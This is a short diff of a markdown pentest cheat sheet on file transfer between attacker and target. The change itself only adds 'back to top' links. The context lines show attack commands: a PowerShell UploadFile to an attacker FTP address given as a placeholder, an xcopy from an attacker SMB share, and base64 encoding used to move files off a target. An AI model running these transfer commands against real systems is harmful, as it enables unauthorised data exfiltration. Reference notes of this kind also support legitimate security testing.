@@ -23,6 +23,8 @@ then on the target you can transfer whatever you want
 (New-Object Net.WebClient).UploadFile('ftp://$monIp/ftp-hosts', '$cheminFichier')
 ```
 
+[:arrow_up:](#)
+
 ### Upload a file - SMB
 
 launch on the attacker a smb server using python
@@ -37,6 +39,8 @@ then on the target
 xcopy \server\MYSHARE\file.txt C:\path\to\local\directory\
 ```
 
+[:arrow_up:](#)
+
 ### Transfer file from target to attacker
 
 encode in b64 on the target
@@ -50,3 +54,5 @@ then on the attacker
 ```bash
 echo $base64 | base64 -d > $fichier
 ```
+
+[:arrow_up:](#)
